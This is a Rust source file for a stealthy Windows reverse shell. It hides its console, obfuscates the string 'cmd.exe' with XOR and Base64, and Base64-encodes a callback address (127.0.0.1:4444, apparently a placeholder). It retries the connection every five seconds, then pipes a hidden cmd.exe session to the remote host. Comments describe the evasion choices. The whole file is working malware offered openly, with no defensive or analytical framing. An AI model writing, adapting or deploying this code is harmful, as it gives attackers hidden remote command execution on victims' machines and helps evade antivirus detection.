// Indicates that the application runs without a console window
#![windows_subsystem = "windows"]

// Standard library imports
use std::net::TcpStream; // For TCP communication
use std::process::{Command, Stdio, ChildStdin, ChildStdout}; // To spawn and interact with processes
use base64::{engine::general_purpose, Engine}; // To handle Base64 encoding and decoding
use std::time::Duration; // To set delays
use std::io::{Read, Write}; // To handle reading and writing operations
use std::thread; // To create threads
use std::sync::{Arc, Mutex}; // To share resources safely across threads
use std::os::windows::process::CommandExt; // For Windows-specific process flags
use winapi::um::wincon::FreeConsole; // To detach from a console window

// XOR decryption function
// Decrypts the input string using the provided key
fn xor_decryption(input: &str, key: u8) -> String {
    let mut result = Vec::new();

    // XOR each byte of the input with the key
    for byte in input.bytes() {
        result.push(byte ^ key);
    }

    // Convert decrypted bytes back to a UTF-8 string
    String::from_utf8(result).unwrap()
}

// Function to decode the hardcoded cmd.exe string
fn get_cmd_string() -> String {
    // Encrypted string for "cmd.exe", XORed with 0x41 and Base64 encoded
    let encoded = "IiwlbyQ5JA==";

    // Decode from Base64
    let decoded = general_purpose::STANDARD.decode(encoded).unwrap();

    // Decrypt using XOR to get the original "cmd.exe" string
    xor_decryption(&String::from_utf8(decoded).unwrap(), 0x41)
}

// Function to decode a Base64-encoded string
fn decode_str(encoded: &str) -> String {
    let decoded = general_purpose::STANDARD.decode(encoded).unwrap();
    String::from_utf8(decoded).unwrap() // Convert decoded bytes to a string
}

// Main entry point of the application
fn main() {
    // Base64 encoded string for the IP and port (e.g., "127.0.0.1:4444")
    let encoded_ip_port = "MTI3LjAuMC4xOjQ0NDQ=";

    // Decode the IP and port string
    let server_addr = decode_str(encoded_ip_port);

    // Detach the application from the console
    unsafe { FreeConsole() };

    // Infinite loop to attempt connection
    loop {
        // Try to connect to the server at the given IP and port
        match TcpStream::connect(&server_addr) {
            // If connection is successful
            Ok(stream) => {
                // Handle the connection by spawning a cmd.exe process
                handle_connection(stream);
            }
            // If connection fails, wait for 5 seconds before retrying
            Err(_) => {
                thread::sleep(std::time::Duration::from_secs(5));
            }
        }
    }
}

// Function to handle the connection to the server
fn handle_connection(mut stream: TcpStream) {
    // Decode and decrypt the "cmd.exe" string
    let cmd = get_cmd_string();

    // Spawn the cmd.exe process with redirected input, output, and error streams
    let mut child = Command::new(&cmd)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .creation_flags(0x08000000) // Flag to create the process without a console window
        .spawn()
        .expect("."); // better not to hardcode more strings

    // Get references to the stdin and stdout of the child process
    let stdin: Arc<Mutex<ChildStdin>> = Arc::new(Mutex::new(child.stdin.take().unwrap()));
    let stdout: Arc<Mutex<ChildStdout>> = Arc::new(Mutex::new(child.stdout.take().unwrap()));

    // Clone references for thread-safe interaction
    let stdout_clone = Arc::clone(&stdout);
    let mut stream_clone = stream.try_clone().unwrap();

    // Spawn a thread to read data from the child process's stdout and send it to the server
    thread::spawn(move || {
        let mut buffer = [0; 4086]; // Buffer to hold data read from stdout
        loop {
            let mut stdout = stdout_clone.lock().unwrap();
            match stdout.read(&mut buffer) {
                Ok(size) => {
                    if size == 0 {
                        break; // Exit loop if no data is read
                    }
                    stream_clone.write_all(&buffer[..size]).unwrap(); // Send data to server
                }
                Err(_) => break, // Exit loop on error
            }
        }
    });

    // Buffer for reading data from the server
    let stdin_clone = Arc::clone(&stdin);
    let mut buffer = [0; 4086];

    // Loop to read data from the server and write it to the child process's stdin
    loop {
        match stream.read(&mut buffer) {
            Ok(size) => {
                if size == 0 {
                    break; // Exit loop if no data is read
                }
                let mut stdin = stdin_clone.lock().unwrap();
                stdin.write_all(&buffer[..size]).unwrap(); // Send data to child process
            }
            Err(_) => break, // Exit loop on error
        }
    }

    // Wait for the child process to exit
    child.wait().unwrap();
}
